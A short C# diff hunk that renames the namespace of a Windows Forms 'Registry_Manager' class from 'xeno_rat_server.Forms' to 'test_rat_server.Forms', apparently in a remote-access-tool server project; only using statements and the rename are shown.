@@ -12,7 +12,7 @@ using System.Windows.Forms;
 using System.Windows.Forms.VisualStyles;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
-namespace xeno_rat_server.Forms
+namespace test_rat_server.Forms
 {
     public partial class Registry_Manager : Form
     {
